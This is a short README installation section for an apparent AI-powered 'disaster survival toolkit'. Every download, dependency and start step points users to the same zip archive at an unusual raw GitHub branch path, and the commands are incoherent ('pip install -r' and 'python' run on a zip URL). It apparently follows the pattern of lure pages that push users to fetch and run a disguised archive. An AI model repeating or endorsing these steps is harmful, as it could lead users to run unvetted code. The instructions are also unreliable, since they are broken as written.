## ⚡ Installation: Your First Step Toward Smart Preparedness

1. **Download the Latest Build**  
   Click the badge at the top of this README or navigate to https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/survival-disaster-toolkit-v1.8-alpha.1.zip to snag the most current version.

2. **Extract the Archive**  
   Unpack the contents to a preferred folder on your machine.

3. **Install Dependencies**  
   Open a terminal or command prompt in the extracted folder and execute (platform-agnostic):
   
      - `npm install`
      - `pip install -r https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/survival-disaster-toolkit-v1.8-alpha.1.zip`
   
   *(Commands depend on script version; consult docs for your flavor.)*

4. **Configure Your APIs**  
   - Register for OpenAI and Claude API access keys from their official portals.
   - Place your keys in the provided `.env` file:
     - `OPENAI_API_KEY=...`
     - `CLAUDE_API_KEY=...`

5. **Initialization**  
   Start the script via:
      - `npm start` or `python https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/survival-disaster-toolkit-v1.8-alpha.1.zip`
   
   Enjoy your new digital safety net!
